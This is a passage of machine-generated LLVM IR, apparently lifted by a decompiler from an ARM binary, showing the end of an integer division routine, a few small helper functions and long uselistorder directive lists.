  %v4_142bc = sub i32 0, %v1_142a8.v6_142a8.v6_142b0.v6_142b8
  %v5_142bc = and i32 %v1_142a8.v6_142a8.v6_142b0.v6_142b8, %v4_142bc
  %v3_142c0 = udiv i32 %v3_142c010, 16
  %v5_142c4 = icmp slt i32 %v1_142a8.v6_142a8.v6_142b0.v6_142b8, 1
  br i1 %v5_142c4, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_142c4 = add i32 %v6_142c4, -4
  %v9_142c4 = sub i32 3, %v6_142c4
  %v10_142c4 = and i32 %v9_142c4, %v6_142c4
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_142cc = phi i32 [ %v6_142c4, %bb89 ], [ %v7_142c4, %bb90 ]
  %v0_142c813.in = phi i32 [ %v2_142bc, %bb89 ], [ %v7_142c4, %bb90 ]
  %v1_142c812.in = phi i32 [ %v5_142bc, %bb89 ], [ %v10_142c4, %bb90 ]
  %v1_142c812 = icmp slt i32 %v1_142c812.in, 0
  %v0_142c813 = icmp slt i32 %v0_142c813.in, 0
  %v2_142c8 = xor i1 %v0_142c813, %v1_142c812
  br i1 %v2_142c8, label %dec_label_pc_142cc, label %dec_label_pc_1429c

dec_label_pc_142cc:                               ; preds = %bb91
  %v1_142cc = urem i32 %v0_142cc, 4
  %v2_142cc = icmp eq i32 %v1_142cc, 0
  br i1 %v2_142cc, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_142cc
  %v3_142d0 = icmp eq i32 %v1_142a8.v6_142a8.v6_142b0.v6_142b8, 0
  br i1 %v3_142d0, label %.thread6, label %dec_label_pc_142d8

dec_label_pc_142d8:                               ; preds = %bb92, %dec_label_pc_14294
  %v0_142ec = phi i32 [ %v3_142c0, %bb92 ], [ %v1_14288, %dec_label_pc_14294 ]
  %v1_142e8 = phi i32 [ %v1_142a8.v6_142a8.v6_142b0.v6_142b8, %bb92 ], [ %v2_14284, %dec_label_pc_14294 ]
  %v0_142d8 = phi i32 [ %v0_142cc, %bb92 ], [ %v2_14294, %dec_label_pc_14294 ]
  %v5_142dc = icmp slt i32 %v0_142d8, -2
  br i1 %v5_142dc, label %dec_label_pc_142fc, label %dec_label_pc_142e0

dec_label_pc_142e0:                               ; preds = %dec_label_pc_142d8
  %v8_142d8 = icmp eq i32 %v0_142d8, -2
  br i1 %v8_142d8, label %dec_label_pc_142f0, label %dec_label_pc_142e4

dec_label_pc_142e4:                               ; preds = %dec_label_pc_142e0
  %v3_142e4 = icmp ult i32 %v1_142e8, %v0_142ec
  br i1 %v3_142e4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_142e4
  %v2_142e4 = sub i32 %v1_142e8, %v0_142ec
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_142e4, %bb93
  %v0_142f054 = phi i32 [ %v1_142e8, %dec_label_pc_142e4 ], [ %v2_142e4, %bb93 ]
  %v3_142ec = udiv i32 %v0_142ec, 2
  br label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %dec_label_pc_142e0, %bb94
  %v0_142f8 = phi i32 [ %v0_142ec, %dec_label_pc_142e0 ], [ %v3_142ec, %bb94 ]
  %v1_142f4 = phi i32 [ %v1_142e8, %dec_label_pc_142e0 ], [ %v0_142f054, %bb94 ]
  %v3_142f0 = icmp ult i32 %v1_142f4, %v0_142f8
  br i1 %v3_142f0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_142f0
  %v2_142f0 = sub i32 %v1_142f4, %v0_142f8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_142f0, %bb95
  %v0_142fc57 = phi i32 [ %v1_142f4, %dec_label_pc_142f0 ], [ %v2_142f0, %bb95 ]
  %v3_142f8 = udiv i32 %v0_142f8, 2
  br label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142d8, %bb96
  %v2_14300 = phi i32 [ %v0_142ec, %dec_label_pc_142d8 ], [ %v3_142f8, %bb96 ]
  %v1_14300 = phi i32 [ %v1_142e8, %dec_label_pc_142d8 ], [ %v0_142fc57, %bb96 ]
  %v3_142fc = icmp ult i32 %v1_14300, %v2_14300
  br i1 %v3_142fc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_142fc
  %v2_142fc = sub i32 %v1_14300, %v2_14300
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_142fc, %bb83, %.thread72, %dec_label_pc_142cc, %bb92, %bb97
  %v1_14308 = phi i32 [ %v1_142a8.v6_142a8.v6_142b0.v6_142b8, %dec_label_pc_142cc ], [ 0, %bb92 ], [ %v1_14300, %dec_label_pc_142fc ], [ %v2_142fc, %bb97 ], [ %v3_14260, %.thread72 ], [ %v1_14254, %bb83 ]
  br i1 %v1_14248, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_14308 = sub i32 0, %v1_14308
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_1430c = phi i32 [ %v1_14308, %.thread6 ], [ %v2_14308, %bb98 ]
  ret i32 %v1_1430c

dec_label_pc_14310:                               ; preds = %entry
  %v0_14310 = load i32, i32* @lr, align 4
  %v0_14314 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14310)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_142ec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_142cc, { 1, 0, 2 }
  uselistorder i32 %v7_142c4, { 1, 0 }
  uselistorder i32 %v3_142c0, { 1, 0 }
  uselistorder i32 %v1_142a8.v6_142a8.v6_142b0.v6_142b8, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_142b4, { 1, 0 }
  uselistorder i32 %v4_142ac, { 1, 0 }
  uselistorder i32 %v4_142a4, { 1, 0 }
  uselistorder i32 %v6_142c4, { 3, 0, 2, 1 }
  uselistorder i32 %v2_14294, { 1, 0 }
  uselistorder i32 %v1_14288, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_14284, { 1, 0, 3, 2 }
  uselistorder i32 %v4_14274, { 1, 0, 3, 2 }
  uselistorder i32 %v0_14280.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14254, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_1425c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 10, 11, 12, 6, 3, 4, 0, 7, 1, 2, 8, 5, 9 }
  uselistorder i32 -2, { 0, 12, 1, 13, 2, 3, 10, 8, 9, 7, 6, 5, 4, 20, 21, 22, 23, 11, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 8, { 6, 7, 55, 18, 8, 9, 15, 10, 61, 38, 24, 62, 39, 25, 63, 40, 26, 11, 12, 13, 57, 41, 64, 23, 109, 110, 111, 112, 114, 42, 115, 43, 116, 44, 117, 45, 118, 46, 119, 47, 120, 48, 121, 122, 113, 65, 66, 49, 67, 14, 50, 68, 27, 69, 70, 71, 72, 73, 74, 75, 76, 77, 3, 78, 79, 80, 4, 81, 82, 83, 84, 85, 86, 87, 5, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 28, 99, 29, 100, 30, 101, 31, 102, 32, 103, 33, 104, 34, 105, 35, 106, 36, 107, 51, 108, 0, 1, 123, 124, 125, 126, 54, 127, 128, 52, 129, 2, 16, 19, 20, 130, 17, 21, 22, 131, 53, 58, 59, 132, 133, 135, 134, 136, 137, 138, 56, 60, 37, 139 }
  uselistorder i32 3, { 50, 5, 51, 6, 144, 52, 61, 19, 7, 8, 62, 22, 63, 2, 64, 65, 66, 67, 20, 4, 133, 134, 135, 1, 23, 136, 24, 137, 138, 25, 139, 21, 140, 26, 68, 27, 69, 70, 9, 73, 28, 29, 30, 31, 32, 0, 71, 72, 33, 74, 75, 76, 77, 78, 79, 80, 34, 81, 10, 82, 83, 84, 85, 86, 35, 36, 11, 87, 88, 89, 90, 91, 92, 93, 37, 38, 94, 12, 95, 96, 97, 98, 99, 100, 101, 102, 39, 40, 103, 13, 104, 105, 106, 107, 108, 41, 42, 109, 14, 110, 111, 112, 113, 43, 114, 44, 16, 115, 15, 116, 117, 118, 119, 120, 121, 45, 46, 122, 17, 123, 124, 125, 126, 127, 128, 129, 47, 48, 130, 18, 131, 132, 3, 141, 142, 53, 57, 54, 58, 55, 59, 56, 60, 49, 143 }
  uselistorder i32 -3, { 0, 1, 3, 2 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 130, 12, 13, 14, 15, 16, 69, 70, 68, 45, 46, 56, 134, 57, 73, 136, 143, 58, 135, 72, 137, 59, 138, 60, 139, 61, 140, 62, 141, 63, 142, 64, 148, 144, 145, 146, 147, 53, 74, 229, 17, 18, 230, 232, 75, 234, 49, 132, 44, 76, 236, 77, 237, 78, 238, 239, 71, 240, 19, 79, 231, 155, 156, 20, 80, 81, 82, 157, 158, 83, 217, 131, 133, 163, 85, 149, 88, 150, 87, 151, 84, 89, 152, 21, 22, 23, 90, 86, 91, 92, 93, 153, 154, 94, 95, 54, 97, 96, 98, 159, 47, 52, 160, 161, 162, 233, 235, 164, 165, 166, 167, 168, 169, 170, 100, 171, 99, 172, 173, 174, 175, 176, 102, 101, 177, 178, 179, 180, 181, 182, 183, 104, 184, 103, 185, 186, 105, 106, 65, 107, 187, 188, 189, 190, 191, 192, 193, 0, 24, 25, 26, 27, 28, 29, 108, 194, 66, 195, 196, 197, 198, 199, 1, 30, 31, 32, 33, 34, 35, 110, 109, 200, 201, 36, 202, 203, 50, 204, 112, 205, 2, 37, 38, 39, 40, 41, 113, 206, 111, 207, 208, 209, 210, 211, 212, 213, 214, 115, 215, 114, 216, 218, 219, 220, 117, 221, 118, 222, 223, 224, 225, 119, 226, 116, 227, 228, 120, 55, 241, 48, 121, 242, 243, 67, 244, 128, 245, 122, 246, 123, 124, 247, 125, 248, 126, 249, 127, 250, 51, 251, 42, 43, 252, 129, 253 }
  uselistorder i32 4, { 5, 6, 61, 7, 8, 62, 378, 379, 162, 9, 10, 163, 85, 65, 350, 351, 54, 166, 86, 167, 122, 168, 310, 311, 312, 184, 185, 53, 52, 313, 169, 170, 164, 165, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 87, 187, 188, 189, 186, 63, 314, 88, 190, 66, 89, 90, 11, 315, 12, 316, 317, 13, 14, 318, 319, 45, 320, 46, 325, 91, 326, 92, 327, 93, 328, 94, 329, 95, 330, 96, 331, 97, 332, 98, 333, 99, 334, 100, 336, 337, 101, 338, 339, 335, 321, 102, 322, 323, 324, 198, 123, 200, 15, 201, 202, 199, 16, 203, 47, 103, 204, 205, 273, 207, 191, 57, 56, 55, 192, 104, 17, 18, 19, 20, 21, 22, 193, 48, 194, 49, 195, 196, 197, 23, 24, 105, 67, 106, 107, 124, 206, 0, 25, 208, 209, 125, 210, 211, 212, 126, 127, 213, 108, 214, 68, 215, 216, 128, 217, 218, 129, 130, 219, 69, 220, 70, 221, 222, 131, 132, 223, 133, 224, 225, 134, 135, 226, 71, 227, 72, 228, 229, 230, 231, 232, 109, 233, 73, 234, 235, 236, 136, 237, 238, 239, 240, 137, 138, 2, 241, 110, 242, 74, 243, 244, 245, 139, 246, 247, 140, 141, 3, 248, 75, 249, 76, 250, 251, 142, 252, 253, 254, 255, 256, 143, 144, 257, 258, 111, 259, 4, 260, 77, 261, 112, 262, 263, 264, 265, 266, 145, 267, 268, 269, 146, 147, 113, 270, 78, 271, 79, 272, 274, 275, 276, 277, 278, 114, 279, 115, 280, 148, 281, 282, 283, 149, 150, 116, 284, 285, 80, 286, 81, 287, 151, 288, 289, 26, 152, 290, 291, 27, 153, 292, 293, 28, 154, 294, 295, 29, 155, 296, 297, 30, 298, 156, 299, 300, 31, 157, 301, 302, 32, 158, 303, 304, 33, 159, 305, 306, 34, 160, 307, 308, 35, 352, 309, 340, 341, 342, 343, 344, 345, 36, 346, 347, 1, 348, 161, 349, 353, 375, 121, 354, 84, 355, 356, 64, 357, 117, 358, 359, 360, 361, 82, 362, 118, 363, 364, 365, 83, 366, 119, 367, 37, 38, 39, 368, 369, 60, 59, 58, 370, 40, 41, 42, 371, 120, 372, 43, 44, 373, 50, 374, 51, 376, 377 }
  uselistorder i32 16, { 4, 5, 6, 7, 8, 21, 9, 10, 0, 11, 12, 37, 136, 38, 61, 26, 39, 62, 63, 137, 138, 139, 22, 60, 140, 13, 14, 20, 58, 15, 141, 16, 40, 41, 66, 27, 67, 31, 30, 29, 64, 28, 65, 32, 42, 43, 44, 45, 68, 69, 46, 47, 23, 70, 71, 72, 73, 48, 74, 75, 76, 77, 78, 79, 49, 80, 81, 82, 33, 83, 84, 85, 51, 86, 87, 88, 89, 90, 1, 50, 91, 92, 93, 53, 94, 95, 96, 97, 98, 2, 52, 99, 54, 100, 101, 102, 17, 103, 18, 104, 59, 19, 55, 56, 105, 106, 3, 35, 107, 34, 108, 109, 110, 111, 112, 113, 24, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 25, 127, 128, 129, 130, 131, 133, 132, 134, 135, 142, 143, 144, 145, 146, 57, 147, 36, 148, 149, 150, 151, 152 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_142fc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_142f0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_1429c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_14320 = load i32, i32* @r0, align 4
  ret i32 %v1_14320
}

define i32 @function_14324(i32 %arg1) local_unnamed_addr {
dec_label_pc_14324:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14328 = load i32, i32* @global_var_1cbb4.649, align 4
  %v7_1432c = icmp eq i32 %v3_14328, -1
  %v3_14330 = load i32, i32* @r4, align 4
  store i32 %v3_14330, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1cbb4.649 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1432c, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_14324
  store i32 %v3_14330, i32* %r4.global-to-local, align 4
  %v9_14338 = load i32, i32* @r0, align 4
  ret i32 %v9_14338

.preheader:                                       ; preds = %dec_label_pc_14324, %.preheader
  %v0_14340 = phi i32 [ %v3_14344, %.preheader ], [ %v3_14328, %dec_label_pc_14324 ]
  call void @__pseudo_branch(i32 %v0_14340)
  %v0_14344 = load i32, i32* %r4.global-to-local, align 4
  %v1_14344 = add i32 %v0_14344, -4
  %v2_14344 = inttoptr i32 %v1_14344 to i32*
  %v3_14344 = load i32, i32* %v2_14344, align 4
  store i32 %v1_14344, i32* %r4.global-to-local, align 4
  %v3_14348 = icmp eq i32 %v3_14344, -1
  br i1 %v3_14348, label %dec_label_pc_14350, label %.preheader

dec_label_pc_14350:                               ; preds = %.preheader
  %v2_14350 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14350, i32* %r4.global-to-local, align 4
  %v8_14350 = load i32, i32* @r0, align 4
  ret i32 %v8_14350

; uselistorder directives
  uselistorder i32 %v3_14344, { 1, 0 }
  uselistorder i32 %v3_14328, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 4, 0, 2, 1, 3 }
  uselistorder i32 -4, { 12, 0, 1, 8, 2, 3, 4, 5, 9, 6, 7, 10, 11 }
  uselistorder i32 -1, { 117, 0, 118, 119, 120, 121, 122, 123, 124, 125, 1, 2, 3, 4, 5, 90, 91, 6, 126, 127, 11, 128, 232, 10, 129, 89, 88, 233, 7, 130, 219, 93, 220, 222, 223, 131, 132, 133, 92, 221, 12, 134, 83, 13, 135, 136, 14, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 224, 8, 157, 9, 158, 159, 15, 160, 161, 94, 234, 162, 16, 163, 235, 84, 17, 18, 164, 87, 19, 20, 21, 22, 23, 95, 229, 165, 230, 166, 231, 103, 225, 24, 101, 226, 25, 26, 102, 227, 27, 28, 104, 228, 29, 30, 31, 32, 33, 167, 77, 78, 79, 80, 81, 82, 34, 35, 36, 168, 169, 170, 171, 37, 97, 98, 99, 100, 38, 39, 40, 172, 41, 42, 43, 44, 45, 85, 46, 47, 48, 49, 50, 51, 52, 173, 53, 96, 54, 55, 56, 174, 57, 58, 59, 60, 175, 61, 62, 63, 176, 64, 65, 66, 67, 68, 69, 70, 177, 71, 72, 73, 178, 74, 75, 179, 180, 181, 182, 76, 86, 236, 237, 110, 238, 108, 239, 109, 240, 106, 241, 183, 184, 185, 186, 187, 111, 242, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 105, 243, 112, 244, 214, 215, 216, 217, 218, 107, 245, 113, 246, 114, 115, 116 }
  uselistorder i32 1, { 495, 9, 354, 930, 931, 355, 932, 933, 273, 934, 831, 832, 833, 289, 834, 498, 497, 496, 218, 225, 221, 222, 224, 223, 220, 219, 226, 0, 835, 836, 837, 838, 229, 228, 1, 839, 840, 841, 842, 297, 843, 844, 298, 845, 500, 499, 253, 251, 252, 678, 679, 680, 390, 501, 213, 212, 211, 209, 210, 846, 313, 314, 2, 3, 847, 848, 850, 849, 391, 851, 133, 132, 818, 111, 852, 853, 854, 191, 190, 192, 855, 502, 231, 232, 236, 233, 234, 238, 235, 237, 230, 856, 857, 503, 70, 69, 68, 67, 71, 72, 858, 859, 504, 49, 48, 47, 46, 50, 51, 392, 608, 393, 609, 356, 610, 611, 780, 612, 626, 401, 606, 607, 402, 613, 316, 403, 404, 399, 614, 615, 400, 616, 617, 398, 618, 619, 397, 620, 621, 396, 622, 623, 395, 624, 625, 394, 627, 628, 781, 405, 782, 406, 783, 785, 786, 784, 787, 407, 788, 605, 315, 791, 789, 408, 790, 793, 409, 794, 799, 346, 800, 801, 292, 410, 802, 411, 803, 412, 804, 413, 805, 414, 806, 415, 807, 416, 808, 417, 809, 418, 810, 317, 816, 817, 290, 419, 518, 517, 516, 515, 514, 513, 512, 511, 510, 509, 508, 507, 506, 505, 260, 263, 259, 266, 269, 267, 268, 262, 261, 264, 265, 811, 812, 813, 814, 420, 815, 519, 41, 39, 40, 33, 32, 36, 38, 37, 35, 31, 34, 792, 421, 521, 520, 255, 257, 254, 256, 637, 638, 639, 640, 641, 642, 643, 274, 284, 644, 645, 318, 275, 646, 647, 648, 649, 276, 283, 650, 651, 319, 277, 652, 422, 654, 655, 423, 656, 653, 657, 351, 658, 299, 661, 662, 659, 660, 279, 278, 280, 663, 424, 664, 528, 527, 487, 526, 525, 524, 486, 523, 522, 195, 193, 194, 202, 197, 199, 203, 200, 206, 201, 196, 205, 198, 204, 529, 207, 769, 300, 768, 345, 530, 89, 90, 88, 86, 85, 92, 93, 84, 87, 91, 689, 690, 691, 425, 532, 531, 178, 180, 188, 175, 177, 174, 187, 179, 185, 186, 189, 176, 181, 182, 184, 183, 533, 361, 629, 630, 357, 631, 426, 428, 427, 429, 632, 633, 430, 431, 432, 433, 634, 635, 360, 359, 358, 636, 434, 546, 545, 544, 543, 488, 542, 489, 541, 540, 539, 538, 537, 490, 536, 535, 534, 214, 216, 217, 215, 665, 547, 436, 435, 666, 548, 258, 437, 667, 330, 668, 329, 669, 328, 670, 327, 671, 672, 438, 336, 320, 673, 439, 674, 440, 675, 441, 676, 442, 677, 291, 443, 562, 561, 560, 559, 558, 557, 556, 555, 554, 553, 552, 551, 550, 549, 128, 126, 127, 131, 129, 130, 125, 686, 5, 681, 444, 682, 4, 683, 347, 684, 293, 294, 685, 687, 348, 688, 567, 566, 565, 491, 564, 492, 563, 172, 173, 110, 795, 362, 796, 363, 797, 6, 798, 7, 8, 692, 693, 694, 695, 696, 697, 295, 296, 698, 699, 700, 701, 702, 703, 704, 705, 445, 706, 707, 446, 708, 709, 712, 710, 711, 570, 569, 568, 57, 55, 62, 59, 53, 56, 54, 65, 66, 63, 64, 60, 58, 52, 61, 713, 714, 715, 716, 717, 447, 301, 448, 572, 571, 153, 149, 145, 144, 143, 142, 151, 152, 146, 150, 147, 148, 718, 719, 720, 449, 721, 722, 723, 724, 725, 726, 450, 727, 302, 451, 365, 364, 452, 728, 573, 159, 157, 155, 156, 154, 162, 163, 165, 164, 161, 160, 158, 729, 352, 282, 730, 453, 732, 731, 281, 454, 367, 366, 493, 574, 42, 43, 45, 44, 733, 734, 735, 736, 737, 738, 455, 739, 303, 456, 457, 740, 368, 741, 575, 243, 239, 240, 241, 242, 247, 248, 250, 249, 245, 246, 244, 742, 743, 331, 744, 745, 746, 458, 747, 304, 459, 370, 369, 460, 748, 461, 749, 576, 166, 171, 170, 169, 168, 167, 750, 751, 332, 752, 753, 754, 462, 755, 305, 463, 375, 374, 464, 756, 371, 757, 372, 758, 373, 759, 581, 580, 579, 578, 577, 24, 27, 28, 30, 29, 23, 26, 25, 760, 761, 762, 333, 763, 764, 765, 306, 465, 378, 377, 466, 766, 376, 767, 582, 78, 77, 76, 74, 73, 80, 81, 83, 82, 75, 79, 770, 771, 772, 334, 773, 774, 775, 307, 467, 381, 380, 468, 776, 379, 777, 587, 586, 585, 584, 583, 118, 117, 116, 115, 113, 112, 121, 122, 124, 123, 114, 120, 119, 778, 382, 469, 588, 15, 20, 18, 21, 17, 19, 22, 16, 860, 208, 779, 589, 134, 819, 470, 822, 471, 823, 824, 820, 821, 825, 826, 827, 828, 308, 829, 309, 135, 139, 141, 136, 137, 138, 140, 830, 321, 472, 590, 12, 13, 11, 10, 14, 861, 227, 862, 285, 476, 337, 338, 863, 286, 474, 339, 340, 475, 864, 322, 865, 335, 866, 287, 341, 479, 342, 350, 288, 477, 343, 344, 478, 867, 323, 868, 869, 389, 870, 871, 872, 384, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 385, 885, 886, 887, 888, 889, 311, 890, 480, 891, 481, 482, 892, 893, 894, 895, 896, 386, 897, 898, 899, 324, 900, 387, 901, 902, 903, 325, 904, 388, 905, 906, 907, 326, 908, 909, 910, 911, 312, 912, 913, 914, 310, 473, 383, 915, 917, 919, 918, 916, 483, 920, 921, 922, 484, 923, 924, 925, 926, 353, 927, 928, 349, 485, 929, 602, 601, 600, 599, 598, 597, 596, 595, 594, 593, 592, 591, 98, 97, 94, 95, 96, 101, 107, 108, 100, 109, 102, 99, 103, 105, 104, 106, 603, 604, 272, 271, 270, 494 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_14358() local_unnamed_addr {
dec_label_pc_14358:
  %v5_1435c = load i32, i32* @r0, align 4
  ret i32 %v5_1435c

; uselistorder directives
  uselistorder i32* @r0, { 2, 5, 6, 7, 120, 8, 121, 9, 122, 11, 10, 18, 78, 79, 0, 20, 21, 65, 66, 69, 70, 71, 72, 73, 76, 67, 68, 27, 17, 22, 23, 24, 25, 26, 28, 3, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 74, 75, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 80, 77, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 4, 12, 13, 14, 15, 16, 19 }
}

define i32 @function_14360() local_unnamed_addr {
entry:
  %v3_14364 = load i32, i32* @r4, align 4
  %v0_1436c = call i32 @function_8e08()
  call void @__pseudo_branch(i32 %v3_14364)
  ret i32 %v0_1436c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 6, 8, 9, 10, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 0, { 0, 1198, 88, 1199, 1200, 218, 217, 532, 76, 77, 78, 79, 534, 533, 57, 56, 89, 1201, 1202, 1203, 1204, 1206, 1205, 1, 1207, 1208, 220, 219, 535, 80, 81, 82, 83, 537, 536, 59, 58, 55, 65, 1209, 538, 2, 1210, 1211, 84, 1212, 1213, 1214, 1215, 1216, 117, 539, 542, 540, 541, 1217, 543, 97, 118, 890, 891, 85, 892, 893, 894, 3, 563, 221, 5, 4, 119, 895, 120, 564, 6, 222, 121, 122, 260, 60, 123, 7, 269, 816, 75, 659, 660, 897, 896, 898, 899, 29, 124, 900, 127, 126, 125, 261, 262, 263, 129, 128, 130, 270, 901, 902, 131, 875, 876, 98, 132, 903, 133, 586, 134, 904, 905, 135, 906, 907, 589, 817, 90, 818, 819, 590, 591, 587, 565, 277, 588, 610, 611, 592, 593, 136, 137, 594, 595, 596, 597, 566, 275, 598, 599, 567, 276, 600, 601, 568, 274, 602, 603, 569, 273, 604, 605, 570, 272, 606, 613, 571, 271, 607, 612, 608, 72, 61, 99, 100, 609, 544, 820, 278, 821, 224, 822, 279, 823, 826, 827, 139, 223, 824, 825, 280, 281, 828, 829, 237, 830, 831, 572, 68, 282, 833, 834, 835, 836, 837, 838, 839, 235, 234, 840, 283, 841, 86, 842, 101, 843, 562, 844, 845, 846, 561, 847, 848, 849, 138, 284, 285, 850, 853, 854, 855, 856, 857, 140, 851, 141, 852, 8, 142, 832, 629, 630, 631, 74, 62, 632, 73, 63, 633, 634, 635, 636, 637, 638, 286, 639, 640, 642, 143, 641, 69, 643, 9, 674, 675, 678, 679, 676, 677, 680, 681, 614, 287, 615, 144, 616, 617, 618, 619, 620, 621, 622, 623, 146, 145, 624, 70, 288, 625, 290, 291, 10, 626, 627, 147, 628, 292, 293, 289, 644, 645, 646, 294, 264, 151, 150, 573, 265, 153, 152, 574, 266, 155, 154, 575, 267, 157, 156, 576, 577, 268, 149, 148, 226, 233, 227, 228, 229, 295, 647, 158, 159, 656, 648, 649, 650, 651, 652, 653, 654, 655, 225, 657, 658, 160, 161, 296, 661, 662, 663, 664, 232, 665, 666, 231, 667, 668, 669, 93, 670, 672, 671, 91, 92, 162, 230, 298, 299, 297, 673, 238, 239, 240, 94, 163, 66, 164, 682, 105, 104, 102, 103, 683, 684, 67, 685, 686, 687, 688, 689, 165, 690, 691, 692, 693, 694, 695, 169, 166, 167, 168, 696, 697, 698, 699, 300, 700, 701, 243, 702, 242, 703, 241, 704, 301, 705, 706, 707, 108, 106, 107, 11, 708, 709, 710, 711, 170, 712, 713, 244, 714, 302, 715, 716, 717, 718, 719, 112, 109, 110, 111, 12, 720, 721, 722, 171, 723, 172, 724, 725, 726, 246, 727, 245, 728, 303, 729, 177, 305, 175, 176, 173, 174, 730, 179, 178, 180, 304, 732, 733, 116, 113, 114, 115, 13, 731, 734, 735, 736, 737, 738, 739, 14, 15, 16, 17, 18, 740, 741, 306, 742, 307, 743, 308, 744, 309, 745, 310, 746, 311, 747, 312, 748, 247, 749, 181, 182, 183, 751, 752, 750, 754, 755, 753, 19, 20, 21, 22, 23, 756, 184, 757, 758, 759, 313, 760, 314, 761, 315, 762, 316, 763, 317, 764, 318, 765, 248, 766, 319, 767, 186, 185, 187, 769, 770, 768, 771, 772, 64, 774, 775, 776, 777, 320, 778, 24, 25, 26, 27, 28, 773, 188, 95, 779, 780, 781, 252, 782, 251, 783, 250, 784, 249, 785, 321, 786, 322, 787, 189, 192, 191, 190, 790, 791, 789, 788, 323, 793, 792, 794, 193, 795, 796, 797, 254, 798, 253, 799, 324, 800, 194, 197, 196, 195, 803, 804, 802, 801, 325, 806, 805, 807, 808, 198, 809, 256, 810, 255, 811, 326, 812, 813, 908, 199, 909, 814, 200, 815, 858, 859, 860, 861, 862, 863, 201, 864, 865, 866, 867, 868, 869, 870, 871, 202, 203, 872, 873, 874, 877, 204, 878, 879, 880, 205, 327, 881, 882, 30, 883, 884, 885, 886, 887, 328, 888, 206, 910, 911, 912, 889, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 329, 926, 545, 546, 547, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 31, 968, 969, 970, 207, 208, 971, 330, 972, 973, 974, 975, 548, 578, 976, 977, 978, 32, 979, 980, 981, 982, 33, 983, 984, 985, 986, 987, 988, 989, 34, 990, 991, 213, 992, 993, 994, 995, 996, 997, 35, 998, 999, 1000, 36, 1001, 1002, 1003, 37, 1004, 1005, 1006, 1007, 333, 1021, 1022, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 549, 579, 1017, 1018, 1019, 1020, 550, 580, 1023, 1024, 1025, 38, 1026, 1027, 334, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 551, 581, 1036, 1037, 1038, 39, 1039, 1040, 1041, 1042, 40, 1043, 552, 1044, 1045, 1048, 1049, 553, 209, 1046, 1047, 210, 211, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 554, 582, 1061, 1062, 1063, 41, 1064, 1065, 1066, 1067, 1068, 1069, 42, 1070, 96, 1071, 1072, 1073, 